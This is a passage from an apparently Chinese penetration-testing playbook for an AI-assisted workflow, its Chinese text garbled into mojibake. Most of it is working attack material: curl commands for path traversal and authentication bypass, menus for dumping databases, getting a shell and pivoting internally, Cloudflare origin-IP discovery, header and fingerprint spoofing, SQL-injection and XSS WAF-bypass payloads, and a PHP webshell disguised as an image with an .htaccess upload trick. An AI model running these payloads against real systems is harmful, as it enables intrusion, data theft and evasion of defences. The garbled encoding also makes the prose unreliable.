echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "è®°å½•ç¡®è®¤çš„æ³¨å…¥ç‚¹"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

---

### ç¬¬6-13æ­¥ï¼šå…¶ä»–æµ‹è¯•æ¨¡å—

```bash
# ç¬¬6æ­¥ï¼šWAFè¯†åˆ«ä¸ç»•è¿‡ï¼ˆæ‰‹åŠ¨æµ‹è¯•ï¼‰
# ç¬¬7æ­¥ï¼šç«¯å£æ‰«æï¼ˆå·¥å…·æ‰«æ + äººå·¥åˆ†æï¼‰
# ç¬¬8æ­¥ï¼šæœåŠ¡æ”»å‡»ï¼ˆæ‰‹åŠ¨éªŒè¯æ¯ä¸ªæœåŠ¡ï¼‰
# ç¬¬9æ­¥ï¼šæ–‡ä»¶æ³„éœ²æ£€æµ‹ï¼ˆæ‰‹åŠ¨ç¡®è®¤æ³„éœ²å†…å®¹ï¼‰
# ç¬¬10æ­¥ï¼šæƒé™æå‡ï¼ˆæ‰‹åŠ¨æµ‹è¯•ï¼‰
# ç¬¬11æ­¥ï¼šå†…ç½‘æ¸—é€ï¼ˆäººå·¥å†³ç­–æ¯ä¸€æ­¥ï¼‰
# ç¬¬12æ­¥ï¼šæ•°æ®å¯¼å‡ºï¼ˆæ‰‹åŠ¨é€‰æ‹©ç›®æ ‡ï¼‰
# ç¬¬13æ­¥ï¼šæŒä¹…åŒ–ï¼ˆéœ€äººå·¥ç¡®è®¤ï¼‰
```

---

## ğŸ¯ è¯¯æŠ¥è¯†åˆ«é€ŸæŸ¥è¡¨

### API/Webæ¼æ´

| å·¥å…·æŠ¥å‘Š | éªŒè¯æ–¹æ³• | è¯¯æŠ¥ç‰¹å¾ |
|---------|---------|---------|
| æœªæˆæƒè®¿é—® | `curl -sk URL \| jq .` | è¿”å›"éœ€è¦ç™»å½•"æˆ–ç©ºæ•°ç»„ |
| SQLæ³¨å…¥ | æ‰‹åŠ¨æµ‹è¯•å•å¼•å· | æ— SQLé”™è¯¯ï¼Œé•¿åº¦ä¸å˜ |
| XSS | æ‰‹åŠ¨æ’å…¥payload | è¢«HTMLç¼–ç æˆ–è¿‡æ»¤ |
| IDOR | æšä¸¾å¤šä¸ªID | æ‰€æœ‰IDè¿”å›403/404 |
| JWTå¼±å¯†é’¥ | jwt_toolçˆ†ç ´ | æ— æ³•ä¼ªé€ æœ‰æ•ˆtoken |
| CORSé…ç½® | æ£€æŸ¥å®é™…å“åº” | æœ‰OriginéªŒè¯ |
| æ•æ„Ÿä¿¡æ¯æ³„éœ² | æŸ¥çœ‹å®é™…å†…å®¹ | æ˜¯ç¤ºä¾‹ä»£ç æˆ–å…¬å¼€ä¿¡æ¯ |

### Nucleiè¯¯æŠ¥

| æ¨¡æ¿ | å¸¸è§è¯¯æŠ¥ | éªŒè¯æ–¹æ³• |
|------|---------|---------|
| SSLé…ç½® | è¯ä¹¦é—®é¢˜ä½†ä¸å½±å“ | æµè§ˆå™¨èƒ½æ­£å¸¸è®¿é—® |
| å“åº”å¤´ç¼ºå¤± | X-Frame/CSPç­‰ | ä½å±ï¼Œä¸å¯ç›´æ¥åˆ©ç”¨ |
| ç‰ˆæœ¬æ£€æµ‹ | æ—§ç‰ˆæœ¬ä½†å·²æ‰“è¡¥ä¸ | æ‰‹åŠ¨æµ‹è¯•ç›¸å…³CVE |
| ç›®å½•åˆ—å‡º | ç©ºç›®å½•æˆ–æ— æ•æ„Ÿæ–‡ä»¶ | æ‰‹åŠ¨è®¿é—®ç¡®è®¤å†…å®¹ |
| é»˜è®¤é¡µé¢ | Apache/Nginxé»˜è®¤é¡µ | ä»…é»˜è®¤é¡µï¼Œæ— å®é™…åº”ç”¨ |

---

## ğŸ” æ‰‹åŠ¨éªŒè¯æ ¸å¿ƒæŠ€å·§

### 1. å¿«é€Ÿæ’é™¤è¯¯æŠ¥

```bash
# APIæœªæˆæƒ
curl -sk "$URL" | jq .
# âœ… è¿”å›çœŸå®æ•°æ® â†’ ç¡®è®¤æ¼æ´
# âŒ è¿”å›{"error":"unauthorized"} â†’ è¯¯æŠ¥

# SQLæ³¨å…¥
curl -sk "$URL?id=1" -o baseline
curl -sk "$URL?id=1'" -o test
diff baseline test
# âœ… æœ‰SQLé”™è¯¯æˆ–é•¿åº¦å˜åŒ–å¤§ â†’ å¯èƒ½å­˜åœ¨
# âŒ å®Œå…¨ç›¸åŒæˆ–ä»…è·³è½¬åˆ°é”™è¯¯é¡µ â†’ è¯¯æŠ¥

# æ–‡ä»¶ä¸Šä¼ 
curl -sk "$URL/upload" -F "file=@test.txt"
# âœ… è¿”å›æ–‡ä»¶URL â†’ ç¡®è®¤
# âŒ è¿”å›"ç±»å‹ä¸å…è®¸" â†’ éœ€ç»•è¿‡æµ‹è¯•
```

### 2. æ·±åº¦ç¡®è®¤æŠ€å·§

```bash
# IDORæµ‹è¯•
for id in 1 2 100 1000; do
    curl -sk "$URL/api/user/$id" -H "Cookie: session=USER_A"
done
# çœ‹æ˜¯å¦èƒ½è®¿é—®å…¶ä»–ç”¨æˆ·æ•°æ®

# è®¤è¯ç»•è¿‡
curl -sk "$URL/admin" # æ— è®¤è¯
curl -sk "$URL/admin" -H "X-Original-URL: /admin"
curl -sk "$URL/admin" -H "X-Forwarded-For: 127.0.0.1"
# å¤šç§æ–¹æ³•å°è¯•

# æ–‡ä»¶è¯»å–
curl -sk "$URL/download?file=../../../../etc/passwd"
curl -sk "$URL/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
# å¤šç§ç¼–ç å°è¯•
```

---

## ğŸš« è‡ªåŠ¨åŒ–è¾¹ç•Œï¼ˆä»€ä¹ˆä¸è‡ªåŠ¨ï¼‰

### âŒ ç¦æ­¢è‡ªåŠ¨æ‰§è¡Œ

1. **GetShellåçš„æ“ä½œ** - å¿…é¡»äººå·¥å†³ç­–
2. **æ•°æ®åº“å¯¼å‡º** - äººå·¥é€‰æ‹©è¡¨
3. **å¤§è§„æ¨¡æšä¸¾** - äººå·¥ç¡®è®¤èŒƒå›´
4. **å†…ç½‘æ‰«æ** - äººå·¥æ‰¹å‡†æ¯ä¸ªç½‘æ®µ
5. **æ¨ªå‘ç§»åŠ¨** - äººå·¥é€‰æ‹©ç›®æ ‡
6. **æŒä¹…åŒ–æ“ä½œ** - äººå·¥ç¡®è®¤æ–¹æ³•

### âœ… å¯ä»¥è‡ªåŠ¨åŒ–

1. **å­åŸŸåæšä¸¾** - è¢«åŠ¨æ”¶é›†
2. **ç«¯å£æ‰«æ** - éå…¥ä¾µæ€§
3. **æŒ‡çº¹è¯†åˆ«** - ä¿¡æ¯æ”¶é›†
4. **ç›®å½•Fuzz** - å¸¸è§„è·¯å¾„
5. **JSæ–‡ä»¶ä¸‹è½½** - å…¬å¼€èµ„æº
6. **APIç«¯ç‚¹æå–** - é™æ€åˆ†æ

---

## ğŸ’¡ å®æˆ˜å†³ç­–ç‚¹

### å†³ç­–ç‚¹1ï¼šå‘ç°æœªæˆæƒAPI

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ¯ å‘ç°ï¼šæœªæˆæƒAPI - /api/users"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "é€‰æ‹©ä¸‹ä¸€æ­¥ï¼š"
echo "1. æ‰¹é‡æšä¸¾æ‰€æœ‰ç”¨æˆ·ï¼ˆå¯èƒ½è¢«banï¼‰"
echo "2. é‡‡æ ·100ä¸ªç”¨æˆ·ï¼ˆå®‰å…¨ï¼‰"
echo "3. ä»…å¯¼å‡ºç®¡ç†å‘˜è´¦æˆ·ï¼ˆç²¾å‡†ï¼‰"
echo "4. æš‚åœï¼Œç­‰å¾…è¿›ä¸€æ­¥æŒ‡ç¤º"
echo ""
echo "è¾“å…¥é€‰æ‹© [1-4]:"
```

### å†³ç­–ç‚¹2ï¼šå‘ç°SQLæ³¨å…¥

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ¯ ç¡®è®¤ï¼šSQLæ³¨å…¥ - /search?q="
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "é€‰æ‹©åˆ©ç”¨æ–¹å¼ï¼š"
echo "1. å¿«é€Ÿå¯¼å‡ºå½“å‰æ•°æ®åº“ï¼ˆ5åˆ†é’Ÿï¼‰"
echo "2. å®Œæ•´è½¬å‚¨æ‰€æœ‰æ•°æ®åº“ï¼ˆ30åˆ†é’Ÿ+ï¼Œé«˜é£é™©ï¼‰"
echo "3. ä»…è·å–ç”¨æˆ·è¡¨ï¼ˆç²¾å‡†ï¼‰"
echo "4. å°è¯•GetShellï¼ˆé«˜é£é™©ï¼‰"
echo "5. æš‚åœ"
echo ""
echo "è¾“å…¥é€‰æ‹© [1-5]:"
```

### å†³ç­–ç‚¹3ï¼šå‘ç°å†…ç½‘

```bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ¯ å·²GetShell - å‘ç°å†…ç½‘: 10.0.0.0/8"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "é€‰æ‹©ç­–ç•¥ï¼š"
echo "1. ä»…æ‰«æå½“å‰ç½‘æ®µï¼ˆ10.0.1.0/24ï¼‰"
echo "2. æ‰«æå¸¸è§æœåŠ¡å™¨IPï¼ˆ10.0.1.1-10ï¼‰"
echo "3. å»ºç«‹ä»£ç†ï¼Œæ‰‹åŠ¨æ¢æµ‹"
echo "4. æš‚åœï¼Œç­‰å¾…æˆæƒ"
echo ""
echo "è¾“å…¥é€‰æ‹© [1-4]:"
```

---

## ğŸ“Š ç»“æœåˆ†ç±»æ¨¡æ¿

### é«˜å±å¯åˆ©ç”¨ï¼ˆçº¢è‰²ï¼‰
```bash
cat > HIGH_RISK.md << 'EOF'
# é«˜å±æ¼æ´ï¼ˆå·²ç¡®è®¤å¯åˆ©ç”¨ï¼‰

## 1. SQLæ³¨å…¥ - ç”¨æˆ·æœç´¢åŠŸèƒ½
- URL: https://target.com/search?q=
- ç±»å‹: Unionæ³¨å…¥
- éªŒè¯: å·²å¯¼å‡ºusersè¡¨å‰10æ¡
- å½±å“: å¯è·å–æ‰€æœ‰ç”¨æˆ·æ•°æ®
- åˆ©ç”¨éš¾åº¦: â­ï¼ˆç®€å•ï¼‰

## 2. æœªæˆæƒAPI - ç”¨æˆ·ç®¡ç†æ¥å£
- URL: https://target.com/api/users
- éªŒè¯: æ— éœ€tokenå¯è®¿é—®
- å½±å“: å¯æšä¸¾æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯
- åˆ©ç”¨éš¾åº¦: â­ï¼ˆç®€å•ï¼‰
EOF
```

### å¯ç–‘å¾…ç¡®è®¤ï¼ˆé»„è‰²ï¼‰
```bash
cat > SUSPICIOUS.md << 'EOF'
# å¯ç–‘é—®é¢˜ï¼ˆéœ€è¿›ä¸€æ­¥æµ‹è¯•ï¼‰

## 1. å¯èƒ½çš„IDOR - è®¢å•æŸ¥è¯¢
- URL: https://target.com/api/order/123
- ç°çŠ¶: å¯è®¿é—®ï¼Œä½†è¿”å›"æƒé™ä¸è¶³"
- å¾…æµ‹è¯•: å°è¯•ä¸åŒCookieç»„åˆ
- ä¼˜å…ˆçº§: ä¸­

## 2. GraphQLå†…çœæŸ¥è¯¢
- URL: https://target.com/graphql
- ç°çŠ¶: å†…çœå¼€æ”¾ï¼Œä½†éœ€è®¤è¯
- å¾…æµ‹è¯•: JWTç»•è¿‡
- ä¼˜å…ˆçº§: é«˜
EOF
```

### è¯¯æŠ¥æ¸…å•ï¼ˆç°è‰²ï¼‰
```bash
cat > FALSE_POSITIVES.md << 'EOF'
# è¯¯æŠ¥æ¸…å•ï¼ˆå·²æ’é™¤ï¼‰

## 1. NucleiæŠ¥å‘Š - SSLé…ç½®é—®é¢˜
- åŸå› : è¯ä¹¦é“¾å®Œæ•´ï¼Œæµè§ˆå™¨æ­£å¸¸è®¿é—®
- ç»“è®º: ä½å±ï¼Œä¸å½±å“å®‰å…¨æ€§

## 2. æœªæˆæƒAPI - /api/public
- åŸå› : æ˜¯å…¬å¼€APIï¼Œè®¾è®¡å¦‚æ­¤
- ç»“è®º: éæ¼æ´

## 3. ç›®å½•åˆ—è¡¨ - /images/
- åŸå› : ä»…å›¾ç‰‡æ–‡ä»¶ï¼Œæ— æ•æ„Ÿä¿¡æ¯
- ç»“è®º: ä½å±
EOF
```

---

## ğŸ¯ å®Œæ•´å·¥ä½œæµç¤ºä¾‹

```bash
# 1. å¯åŠ¨é¡¹ç›®
TARGET="example.com"
WORK_DIR="/workspace/${TARGET}_pentest"
mkdir -p $WORK_DIR && cd $WORK_DIR

# 2. èµ„äº§æ”¶é›†ï¼ˆè‡ªåŠ¨ï¼‰
subfinder -d $TARGET -o subs.txt
cat subs.txt | httpx -o alive.txt

# 3. äººå·¥ç­›é€‰
cat alive.txt | grep -iE 'admin|api' > priority.txt
# ã€æš‚åœã€‘æ‰‹åŠ¨æŸ¥çœ‹ï¼Œæ’é™¤CDN

# 4. æ¼æ´æ‰«æï¼ˆè‡ªåŠ¨ï¼‰
nuclei -l priority.txt -severity critical,high -o vulns.txt

# 5. äººå·¥éªŒè¯
cat vulns.txt
# ã€æš‚åœã€‘é€ä¸ªæ‰‹åŠ¨æµ‹è¯•ï¼Œè®°å½•åˆ°confirmed.txt

# 6. æ·±åº¦åˆ©ç”¨ï¼ˆäººå·¥å†³ç­–æ¯ä¸€æ­¥ï¼‰
# ã€æš‚åœã€‘è¯¢é—®ï¼šæ˜¯å¦æ‰¹é‡æšä¸¾APIï¼Ÿ
# ã€æš‚åœã€‘è¯¢é—®ï¼šæ˜¯å¦å°è¯•SQLæ³¨å…¥åˆ©ç”¨ï¼Ÿ
# ã€æš‚åœã€‘è¯¢é—®ï¼šæ˜¯å¦å°è¯•GetShellï¼Ÿ

# 7. ç”ŸæˆæŠ¥å‘Šï¼ˆä»…ç¡®è®¤çš„ï¼‰
cat confirmed.txt > FINAL_REPORT.txt
```

---

## ğŸ› ï¸ åŠ©æ‰‹è¡Œä¸ºå‡†åˆ™

### âœ… åº”è¯¥åšçš„

1. **è¿è¡Œå·¥å…·æ”¶é›†ä¿¡æ¯**
2. **å±•ç¤ºåŸå§‹ç»“æœ**
3. **æš‚åœå¹¶ç­‰å¾…äººå·¥åˆ†æ**
4. **æä¾›éªŒè¯å‘½ä»¤**
5. **è§£é‡Šè¯¯æŠ¥ç‰¹å¾**
6. **è¯¢é—®ä¸‹ä¸€æ­¥æ“ä½œ**

### âŒ ä¸åº”è¯¥åšçš„

1. **è‡ªåŠ¨åˆ¤æ–­æ¼æ´çœŸå‡**
2. **æœªç»ç¡®è®¤æ‰§è¡Œåˆ©ç”¨**
3. **è·³è¿‡äººå·¥éªŒè¯ç¯èŠ‚**
4. **è‡ªåŠ¨æ‰¹é‡æ”»å‡»**
5. **æ›¿ç”¨æˆ·åšå†³ç­–**
6. **éšè—å·¥å…·è¾“å‡º**

### ğŸ“‹ äº¤äº’æ¨¡æ¿

```bash
# æ¯ä¸ªé˜¶æ®µç»“æŸå
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "â¸ï¸  å·¥å…·æ‰«æå®Œæˆï¼Œè¯·äººå·¥åˆ†æ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "1. æŸ¥çœ‹ç»“æœ: cat result.txt"
echo "2. éªŒè¯æ–¹æ³•: [æä¾›å…·ä½“å‘½ä»¤]"
echo "3. å®Œæˆåè¾“å…¥: continue"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
```

---

**v10.9 æ ¸å¿ƒç†å¿µï¼šAPTçº§å®Œæ•´æ‰“ç‚¹èƒ½åŠ› + æ‰‹åŠ¨åˆ†æå¢å¼º + 95%æˆåŠŸç‡**

- å·¥å…·è´Ÿè´£è¦†ç›–å¹¿åº¦
- äººå·¥è´Ÿè´£éªŒè¯æ·±åº¦
- æ¯ä¸ªå…³é”®ç‚¹éƒ½è¦æš‚åœ
- è¯¯æŠ¥å¿…é¡»äººå·¥æ’é™¤
- åˆ©ç”¨å¿…é¡»äººå·¥æ‰¹å‡†

---

## ğŸ›¡ï¸ WAF/CDN/é˜²ç«å¢™ç»•è¿‡ä¸“é¡¹ï¼ˆv10.8å¢å¼ºï¼‰

### WAFè¯†åˆ«ï¼ˆå¿«é€Ÿåˆ¤æ–­ï¼‰

```bash
# è‡ªåŠ¨è¯†åˆ«WAF
wafw00f -a https://target.com

# æ‰‹åŠ¨è¯†åˆ«ç‰¹å¾
# Cloudflare
curl -sI https://target.com | grep -i "cloudflare\|cf-ray"

# AWS WAF
curl -sI https://target.com | grep -i "x-amzn\|aws"

# Akamai
curl -sI https://target.com | grep -i "akamai"

# Imperva/Incapsula
curl -sI https://target.com | grep -i "incap\|visid_incap"

# é˜¿é‡Œäº‘ç›¾
curl -sI https://target.com | grep -i "aliyun\|yunjiasu"

# è…¾è®¯äº‘
curl -sI https://target.com | grep -i "tencent"

# 360ä¸»æœºå«å£«
curl -sI https://target.com | grep -i "360wzws"
```

---

## ğŸ”¥ Cloudflare ç»•è¿‡å®Œæ•´æ–¹æ¡ˆ

### æ–¹æ³•1ï¼šçœŸå®IPå‘ç°ï¼ˆæœ€æœ‰æ•ˆï¼‰

```bash
# 1. å†å²DNSè®°å½•
# SecurityTrails API
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
    -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip'

# 2. å­åŸŸåæ‰«æï¼ˆæ‰¾æœªå¼€CFçš„ï¼‰
subfinder -d target.com -silent | while read sub; do
    ip=$(dig +short $sub @8.8.8.8 | grep -E "^[0-9]" | head -1)
    cf=$(curl -sI "https://$sub" | grep -i "cf-ray")
    [ -z "$cf" ] && echo "$sub|$ip|[âœ… æ— CF]"
done

# 3. SSLè¯ä¹¦æŸ¥è¯¢
# ä»crt.shæ‰¾åˆ°æ‰€æœ‰åŸŸåï¼Œå†æŸ¥IP
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    jq -r '.[].name_value' | sort -u | while read domain; do
    ip=$(dig +short $domain @8.8.8.8 | grep -E "^[0-9]" | head -1)
    echo "$domain|$ip"
done

# 4. é‚®ä»¶æœåŠ¡å™¨ï¼ˆé€šå¸¸æ˜¯çœŸå®IPï¼‰
dig +short MX target.com | awk '{print $2}' | while read mx; do
    dig +short $mx
done

# 5. å…¨çƒDNSæŸ¥è¯¢ï¼ˆä¸åŒåœ°åŒºå¯èƒ½æ³„éœ²ï¼‰
for dns in 1.1.1.1 8.8.8.8 114.114.114.114 223.5.5.5 208.67.222.222; do
    echo "DNS: $dns"
    dig +short target.com @$dns
done

# 6. Censys/Shodanæœç´¢
# é€šè¿‡SSLè¯ä¹¦åæŸ¥
shodan search "ssl.cert.subject.CN:target.com" --fields ip_str

# 7. ä»é”™è¯¯é¡µé¢æ³„éœ²
curl -sk https://target.com/nonexist -H "Host: 127.0.0.1" | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}"
```

### æ–¹æ³•2ï¼šåè®®å±‚ç»•è¿‡

```bash
# HTTP/2é™çº§
curl -sk --http1.1 https://target.com

# HTTP/3 (QUIC)
curl -sk --http3 https://target.com

# WebSocketå‡çº§
curl -sk https://target.com -H "Upgrade: websocket" -H "Connection: Upgrade"
```

### æ–¹æ³•3ï¼šè¯·æ±‚å¤´ä¼ªé€ 

```bash
# ä¼ªè£…æˆå†…éƒ¨è¯·æ±‚
curl -sk https://target.com \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Originating-IP: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1" \
    -H "X-Client-IP: 127.0.0.1" \
    -H "True-Client-IP: 127.0.0.1" \
    -H "CF-Connecting-IP: 127.0.0.1"

# è·¯å¾„é‡å†™ï¼ˆç»•è¿‡CFè§„åˆ™ï¼‰
curl -sk https://target.com -H "X-Original-URL: /admin"
curl -sk https://target.com -H "X-Rewrite-URL: /admin"

# ä¼ªè£…æˆçˆ¬è™«ï¼ˆCFç™½åå•ï¼‰
curl -sk https://target.com -H "User-Agent: Googlebot/2.1"
curl -sk https://target.com -H "User-Agent: Bingbot/2.0"
```

### æ–¹æ³•4ï¼šè®¿é—®é¢‘ç‡æ§åˆ¶

```bash
# æ…¢é€Ÿæ‰«æï¼ˆé¿å…è§¦å‘CFé™åˆ¶ï¼‰
for i in {1..100}; do
    curl -sk https://target.com/page$i
    sleep $(shuf -i 3-10 -n 1)  # éšæœºå»¶æ—¶3-10ç§’
done

# è½®æ¢IPï¼ˆé€šè¿‡ä»£ç†ï¼‰
while read proxy; do
    curl -sk https://target.com --proxy $proxy
done < proxy_list.txt
```

### æ–¹æ³•5ï¼šç›´æ¥IPè®¿é—®ï¼ˆç»•è¿‡CFï¼‰

```bash
# å‘ç°çœŸå®IPå
REAL_IP="1.2.3.4"
TARGET="target.com"

# ä¿®æ”¹hostsè®¿é—®
echo "$REAL_IP $TARGET" >> /etc/hosts
curl -sk https://$TARGET

# æˆ–ç›´æ¥IP+Hostå¤´
curl -sk https://$REAL_IP -H "Host: $TARGET" --resolve $TARGET:443:$REAL_IP
```

---

## ğŸ” SQLæ³¨å…¥WAFç»•è¿‡

### é€šç”¨ç»•è¿‡æŠ€å·§

```sql
-- ç©ºæ ¼æ›¿æ¢
'/**/UNION/**/SELECT/**/1,2,3--

-- å¤§å°å†™æ··æ·†
'UnIoN SeLeCt 1,2,3--

-- åŒé‡ç¼–ç 
%2527%2520UNION%2520SELECT%2520--

-- å†…è”æ³¨é‡Š
'/*!50000UNION*//*!50000SELECT*/1,2,3--

-- ç‰¹æ®Šå­—ç¬¦
'%09UNION%09SELECT%091,2,3--  (tab)
'%0aUNION%0aSELECT%0a1,2,3--  (æ¢è¡Œ)

-- å¤šå­—èŠ‚ç¼–ç 
%bf%27 UNION SELECT--  (GBKæ³¨å…¥)

-- å‚æ•°æ±¡æŸ“
id=1&id=2' UNION SELECT--

-- HTTPå‚æ•°æ±¡æŸ“(HPP)
id=1/*&id=*/UNION/*&id=*/SELECT--
```

### Cloudflare WAF SQLç»•è¿‡

```sql
-- payloadç¤ºä¾‹
'||(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables)--

-- æ—¶é—´ç›²æ³¨ï¼ˆCFè¾ƒéš¾æ£€æµ‹ï¼‰
'AND(SELECT*FROM(SELECT(SLEEP(5)))a)--

-- å¸ƒå°”ç›²æ³¨
'AND(SELECT+SUBSTRING(password,1,1)FROM+users+LIMIT+1)='a

-- åŸºäºé”™è¯¯
'AND+extractvalue(1,concat(0x7e,(SELECT+password+FROM+users+LIMIT+1)))--
```

### å›½å†…WAFç»•è¿‡ï¼ˆå®‰å…¨ç‹—/äº‘é”/Dç›¾ï¼‰

```sql
-- å®‰å…¨ç‹—
'/*!12345UNION*//*!12345SELECT*/1,2,3--

-- äº‘é”
'AND(1)=(1)--
'OR(1)=(1)--

-- Dç›¾
'%23%0aUNION%23%0aSELECT%23%0a1,2,3--
```

---

## ğŸ¯ XSS WAFç»•è¿‡

### ç¼–ç ç»•è¿‡

```javascript
// HTMLå®ä½“ç¼–ç 
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// Unicodeç¼–ç 
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

// Base64
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

// Hexç¼–ç 
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">

// å¤§å°å†™æ··æ·†
<ScRiPt>alert(1)</sCrIpT>
```

### æ ‡ç­¾å˜å½¢

```javascript
// ä¸å¸¸ç”¨æ ‡ç­¾
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>

// SVG
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>

// iframe
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
```

### Cloudflare XSSç»•è¿‡

```javascript
// äº‹ä»¶åˆ†ç¦»
<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// æ¨¡æ¿å­—ç¬¦ä¸²
<script>eval`alert\x281\x29`</script>

// DOMå‹XSSï¼ˆCFéš¾æ£€æµ‹ï¼‰
#<img src=x onerror=alert(1)>
```

---

## ğŸ“ æ–‡ä»¶ä¸Šä¼ WAFç»•è¿‡

### æ–‡ä»¶åç»•è¿‡

```bash
# åŒæ‰©å±•å
shell.php.jpg
shell.php.png
shell.php.gif

# å¤§å°å†™
shell.PhP
shell.pHp
shell.PHP

# ç©ºå­—èŠ‚ï¼ˆéƒ¨åˆ†ç¯å¢ƒï¼‰
shell.php%00.jpg
shell.php\x00.jpg

# æœ«å°¾ç‚¹/ç©ºæ ¼ï¼ˆWindowsï¼‰
shell.php.
shell.php[ç©ºæ ¼]

# NTFSäº¤æ¢æ•°æ®æµ
shell.php::$DATA
shell.php:hidden.jpg

# ç½•è§æ‰©å±•å
shell.phtml
shell.php3
shell.php4
shell.php5
shell.phar
shell.phps
```

### MIMEç±»å‹ä¼ªé€ 

```bash
# ä¿®æ”¹Content-Type
curl -sk "$UPLOAD_URL" \
    -F "file=@shell.php;type=image/jpeg"

# æ–‡ä»¶å¤´ä¼ªé€ ï¼ˆå›¾ç‰‡é©¬ï¼‰
echo -e "GIF89a\n<?php system(\$_GET['c']); ?>" > shell.gif
curl -sk "$UPLOAD_URL" -F "file=@shell.gif"
```

### .htaccessé…åˆ

```bash
# ä¸Šä¼ .htaccessï¼ˆå¦‚æœå…è®¸ï¼‰
echo "AddType application/x-httpd-php .jpg" > .htaccess
curl -sk "$UPLOAD_URL" -F "file=@.htaccess"

# ç„¶åä¸Šä¼ å›¾ç‰‡é©¬
echo '<?php system($_GET["c"]); ?>' > shell.jpg
curl -sk "$UPLOAD_URL" -F "file=@shell.jpg"
```

---

## ğŸŒ CDN/é˜²ç«å¢™é€šç”¨ç»•è¿‡ç­–ç•¥

### 1. IPè½®æ¢ï¼ˆä»£ç†æ± ï¼‰

```bash
# ä½¿ç”¨ä»£ç†æ± è½®æ¢
cat proxy_list.txt | while read proxy; do
    curl -sk https://target.com --proxy $proxy -H "User-Agent: Mozilla/5.0"
    sleep 2
done
```

### 2. User-Agentè½®æ¢

```bash
# éšæœºUA
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
)

for i in {1..100}; do
    UA="${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}"
    curl -sk https://target.com -H "User-Agent: $UA"
done
```

### 3. åˆ†ç‰‡è¯·æ±‚ï¼ˆç»•è¿‡æ£€æµ‹ï¼‰

```bash
# Rangeè¯·æ±‚åˆ†ç‰‡ä¸‹è½½
curl -sk https://target.com/file -H "Range: bytes=0-1024"
curl -sk https://target.com/file -H "Range: bytes=1025-2048"
```

### 4. åè®®é™çº§

```bash
# HTTP/2 â†’ HTTP/1.1
curl -sk --http1.1 https://target.com

# HTTPS â†’ HTTPï¼ˆå¦‚æœæ”¯æŒï¼‰
curl -sk http://target.com
```

---

## ğŸ­ åæ£€æµ‹æŠ€æœ¯

### æµè§ˆå™¨æŒ‡çº¹ä¼ªé€ 

```bash
# å®Œæ•´æµè§ˆå™¨æŒ‡çº¹
curl -sk https://target.com \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "DNT: 1" \
    -H "Connection: keep-alive" \
    -H "Upgrade-Insecure-Requests: 1" \
    -H "Sec-Fetch-Dest: document" \
    -H "Sec-Fetch-Mode: navigate" \
    -H "Sec-Fetch-Site: none" \
    -H "Sec-Fetch-User: ?1" \
    -H "Cache-Control: max-age=0"
```

### Cookieç®¡ç†

```bash
# ä¿æŒä¼šè¯
curl -sk https://target.com -c cookies.txt  # ä¿å­˜cookie
curl -sk https://target.com -b cookies.txt  # ä½¿ç”¨cookie
```

### TLSæŒ‡çº¹ä¼ªé€ 

```bash
